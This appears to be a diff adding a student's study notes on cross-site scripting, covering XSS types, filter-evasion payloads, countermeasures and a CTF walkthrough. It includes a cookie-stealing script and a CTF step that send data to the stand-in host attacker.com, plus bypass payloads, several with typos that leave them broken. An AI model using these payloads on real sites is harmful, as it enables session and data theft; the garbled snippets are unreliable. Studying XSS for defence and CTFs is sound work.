@@ -1,0 +1,67 @@
+# XSS
+#  - an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website
+#  - Stored XSS: Board or DB
+#  - Reflected XSS: Server, GET Method, URL Transmission
+#  - Dom Based XSS
+#  - Cookie Steal = <script>var cookieData = document.cookie;var i = new Image();i.src = "http://attacker.com" + cookieData;</script>
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+# XSS countermeasure
+#  - detour method
+#    = Mix upper and lower case
+#    = image tag => <img src=x oneerror = "alert(1)">
+#    = herf => <a href="javascript"alert(1)">TEST</a>
+#    = javascript XSS < , > => ";alert(1);var+a = "
+#                           => <script> var data = "________";
+#    = input XSS => <input type = "text" value="efwe">
+#                => <input type = "text" onmousehandler="alert(1)"
+#  - HTML special character -> HTML Entity
+#  - HTML Editor
+#    1) HTML special charaters replace to HTML Entity in parameter.
+#    2) Distiguish avaiable tags, and make it revive (Based on white list).
+#    3) Revived tags were filtered in violated envet handler based on black lists
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+# Client Script
+#  - Page Redirect => <script>location.href="google.com";</script>
+#                  => <script>location.replace("google.com")</script>
+#  - Modulate address => <script>history.pushState(null, null, 'test')</script>
+#  - DOM object contact
+#  - document.getElement
+#  - document.getElementById('userName');
+#  - document.getElementsByClassName('card-title');
+#  - document.getElementsByClassName('card-title')[0];      => tracking the number to pull out the information
+#  - document.getElementById('userName');.className      => pull out the other element information
+#  - document.getElementById('userName').innerHTML;        => Tag inside information
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+# CTF - Basic Script Prac
+#  1. Open DevTol and check where is the location to bring out the flag information.
+#  2. In the Console at DevTol, type document.getElementsByNamme('info')      => bring the information
+#  3. In the Console at DevTol, type document.getElementsByNamme('info')[0]      => getElements is the list, so make it specified
+#  4. Type document.getElementsByName('info')[0].placeholder      => get the single element information
+#  5. Make attack statement => var secretData = document.getElementsByName('info')[0].placeholder; console.log(secretData);
+#  6. Check the attack statement in the Console
+#  7. In burp suite, check XSS availability
+#  8. Type <"'>, next to username "seungho"
+#  9. Make XSS attack statement => "><img+src=x+onerror="alert(1)
+#  10. Input the attack statement => "><img+src=x+onerror="var+secretData=document.getElementsByName('info')[0].placeholder;console.log(secretData);
+#  * To use script = window.addEventListener('DOMContentLoaded'function(){ //execute code});
+#  9-1. Make XSS attack statement => "><script>alert(1)</script>
+#  10-1. Input the attack statement => "><script>window.addEventListener('DOMContentLoaded'function(){<img+src=x+onerror="var+secretData=document.getElementsByName('info')[0].placeholder;console.log(secretData);});</script>
+#  11. Print the flag => var i = new Image();i.src = "HTTP://attacker.com"+secretData
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+# XSS in Board
+#  - iframe => <ifram src="HTTP://~~~/mypage.php"id="tagetFrame"></iframe>
+#  - <script>var tagetTag = document.getElementByID('targetFrame');var DOMData = targetTag.contentDocument;DOMData.getElementByID()</script>
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+# Assignmnet
+#  - Review
+#  - CTF
